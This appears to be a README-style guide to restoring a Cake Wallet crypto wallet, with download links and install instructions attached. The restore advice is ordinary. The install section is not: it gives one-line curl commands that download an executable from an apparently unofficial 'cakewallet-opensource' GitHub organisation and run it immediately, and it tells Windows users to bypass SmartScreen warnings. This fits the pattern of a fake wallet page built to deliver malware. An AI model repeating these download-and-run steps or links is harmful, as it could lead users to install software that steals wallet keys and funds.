![Cake Wallet restore wallet guide](assets/cake-wallet-restore-wallet-article-banner.png)

# Restore an Existing Wallet in Cake Wallet

Which restore option matches the backup you actually saved.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the wallets menu, choose Restore Wallet, then pick the path that matches your backup: recovery phrase or keys, Cupcake, hardware wallet, QR code or backup file. A restore copies keys into this device; it does not move funds or disable the old wallet. Restore on the current build and check the balance before you wipe anything.

<!-- ARTICLE-BODY-BEGIN -->

## What you can restore from
Five backup shapes exist and each has one matching route. A phrase or set of keys goes through the phrase route; a backup file goes through the file route; a QR code carries a phrase, an xpub or a pairing payload; a hardware device is its own route. Choosing the wrong one is the usual reason a valid backup appears rejected.

If you are unsure what you saved, look before you type. A 12 or 24-word phrase, a string of Monero keys, a Bitcoin xpub and an encrypted file are four different objects. The <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> supports all five routes, so there is no reason to restore on an old build and then update.

## Restoring from a phrase
Pick phrase or keys, choose the coin the phrase belongs to, and enter the words in order. Monero wallets often carry 25 words; those are restored under the Legacy seed type, which is a separate choice from the standard Monero seed. Bitcoin, Litecoin and other coins use their own derivation, so a phrase restored into the wrong coin type produces a valid but empty wallet.

Have the phrase in front of you rather than in a screenshot, and type slowly. If the app rejects a word, the usual cause is a word outside the list rather than a wrong phrase. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Find your Cake Wallet recovery phrase</a> explains where the words live in a working wallet so you can compare what you saved.

## Restoring from a file or a QR code
An encrypted backup file needs its password, which is not the wallet PIN. A QR restore accepts a Cake Wallet seed or keys QR, a Bitcoin xpub or zpub for a watch-only wallet, or a Cupcake pairing code; it does not accept a bare private key or a single address.

Scanning is faster but less forgiving than typing: a damaged or partial QR fails without explaining which part was wrong. If a scan keeps failing, fall back to the words, which are the same data in a form you can check by eye.

## Moving to a new phone
Install the app, restore, and confirm the balance and history before you remove the old install. iCloud or Google device backups do not carry the wallet keys in a usable form, so an iCloud restore of the phone is not a wallet restore.

If the wallet is damaged, incomplete or shows a partial history, the phrase is still the authority. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md">Restore a paper wallet in Cake Wallet</a> covers the case where the only backup is an old printout with keys rather than words.

## Paper wallets are different
A paper wallet usually holds keys, not a phrase, and there is no sweep button that moves everything in one action. For Bitcoin, importing the key and then sending to a fresh address is the route; for Monero keys, the keys route applies. What works depends on what the paper actually contains.

The distinction matters because a sweep expectation leads people to import keys into the wrong account and conclude the funds are gone. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-watch-only.md">Add a watch-only Cake Wallet wallet</a> covers the case where you have an xpub and want the balance visible without spending keys on the device.

## Hardware and air-gapped devices
A hardware wallet is added rather than restored: connect it, choose the hardware route, and approve on the device. Cupcake works the same way but pairs by QR code from an offline phone, and it pairs with the mobile app rather than the macOS or Linux builds.

Neither route imports keys into Cake Wallet. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md">Connect a hardware wallet to Cake Wallet</a> lists the vendors that are evidenced and the per-platform limits, which decide whether your device can be used at all on this machine.

## FAQ
### Can I restore from a backup file?
Yes, if you exported one and remember its password. The file password is separate from the app PIN.
### Why is my phrase rejected?
Usually a word that is not in the list, a wrong seed type for the coin, or a Monero 25-word seed entered as a standard seed.
### Does restoring disable the old phone?
No. Both copies hold the same keys and both keep working until you stop using one.
### What carries over from an iCloud backup?
The app and its settings, not the keys in a usable form. Restore from the phrase instead.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [restore a paper wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md) · [add a watch-only Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-watch-only.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
